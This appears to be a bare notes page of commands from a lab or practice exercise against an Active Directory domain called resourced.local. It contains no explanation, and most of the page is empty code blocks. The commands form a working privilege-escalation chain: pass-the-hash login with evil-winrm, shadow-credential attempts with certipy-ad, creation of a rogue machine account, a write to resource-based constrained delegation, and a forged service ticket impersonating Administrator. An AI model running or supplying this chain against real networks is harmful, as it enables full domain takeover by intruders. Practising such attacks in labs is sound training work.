[[Editing Copy Page]]

```
evil-winrm -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808 -i resourced.local
```

```
certipy-ad shadow auto -u L.Livingstone@resourced.local -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -account 'RESOURCEDC.RESOURCED.LOCAL' -dc-ip 192.168.228.175
```

```
certipy-ad shadow auto -u L.Livingstone@resourced.local -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -account 'RESOURCEDC$' -dc-ip 192.168.228.175
```

```
impacket-addcomputer 'resourced.local/L.Livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip 192.168.228.175
```

```
impacket-rbcd 'resourced.local/L.Livingstone' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -delegate-from 'ATTACKER$' -delegate-to 'RESOURCEDC$' -action write -dc-ip 192.168.228.175
```

```
impacket-getST 'resourced.local/ATTACKER$:Attacker123!' -spn 'cifs/RESOURCEDC.RESOURCED.LOCAL' -impersonate Administrator -dc-ip 192.168.228.175
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```